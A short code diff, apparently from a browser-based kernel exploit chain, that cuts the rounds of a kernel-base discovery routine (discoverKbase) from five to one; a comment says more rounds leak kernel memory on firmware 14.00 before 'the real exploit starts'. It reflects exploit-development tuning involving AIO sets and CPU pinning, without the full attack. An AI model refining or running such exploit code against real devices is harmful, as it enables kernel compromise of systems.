@@ -764,8 +764,10 @@ async function discoverKbase() {
     );
   }
 
-  for (let round = 1; round <= 5; round++) {
-    log("HX1400-ROUTE-ROUND", round + "/5");
+  // FIXED: single round of 12 segments only. 5 rounds leaks kernel memory
+  // on 14.00 and exhausts the browser ceiling before the real exploit starts.
+  for (let round = 1; round <= 1; round++) {
+    log("HX1400-ROUTE-ROUND", round + "/1");
     pinCpu();
 
     const aio = makeAioSet();
@@ -854,7 +856,7 @@ async function discoverKbase() {
 
     restorePin();
 
-    if (round < 5) {
+    if (round < 1) {
       await new Promise((r) => setTimeout(r, 100));
     }
   }
